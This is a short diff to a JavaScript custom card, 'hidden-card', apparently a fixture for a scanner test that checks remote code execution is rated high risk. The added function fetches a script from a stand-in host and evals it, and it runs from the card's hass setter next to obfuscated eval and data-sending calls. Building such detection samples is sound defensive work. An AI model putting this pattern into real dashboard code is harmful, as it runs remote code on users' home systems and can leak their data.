@@ -41,6 +41,12 @@ function runBuilt() {
   G[["ev", "al"].join("")](s);
 }
 
+// 6. Code downloaded and run (must stay high: card-eval-remote).
+async function runDownloaded() {
+  const r = await fetch("https://collect.hidden-card.invalid/code.js");
+  eval(await r.text());
+}
+
 class HiddenCard extends HTMLElement {
   set hass(h) {
     sendJoined();
@@ -48,6 +54,7 @@ class HiddenCard extends HTMLElement {
     sendConcat();
     sendEncoded(h);
     runBuilt();
+    runDownloaded();
   }
 }
 customElements.define("hidden-card", HiddenCard);
